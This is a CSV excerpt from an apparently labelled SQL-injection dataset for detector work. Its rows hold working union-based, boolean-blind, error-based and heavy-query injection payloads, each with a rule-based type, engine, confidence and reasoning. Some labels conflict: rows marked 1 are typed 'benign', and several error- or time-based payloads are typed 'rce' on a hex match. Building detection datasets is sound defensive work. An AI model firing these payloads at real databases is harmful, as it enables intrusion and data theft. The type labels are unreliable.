row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
8263,"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8264,"-3116"" ) ) ) union all select 4600,4600,4600,4600--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8265,"1 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8266,1 where 6304 = 6304,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8267,"-3953 ) as wjjk where 6433 = 6433 or make_set ( 9354 = 9354,7185 ) --",1,,boolean_blind,generic,0.95,6433 = 6433 or detected — boolean_blind injection (priority 8) on generic,rule-based
8268,1' ) where 1115 = 1115,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8269,-7378' or 6872 = 6872 and 'bnmn' like 'bnmn,1,,boolean_blind,generic,0.95,"6872 = 6872 and, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
8270,1 ) ) as ndrh where 6308 = 6308,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8271,1' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 'ulkq' = 'ulkq,1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
8272,"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ""ikhr"" = ""ikhr",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
8273,"1"" ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ""rphs"" = ""rphs",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
8274,"-2568"" ) or ( 8459 = 8459 ) *4906 and ( ""exyw"" = ""exyw",1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
8275,"1"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""pebw"" like ""pebw",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8276,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8277,"1%' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( '%' = '",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8278,1 rlike ( select ( case when ( 8911 = 5301 ) then 1 else 0x28 end ) ) # pmuh,1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
8279,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 'juhi' like 'juhi",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
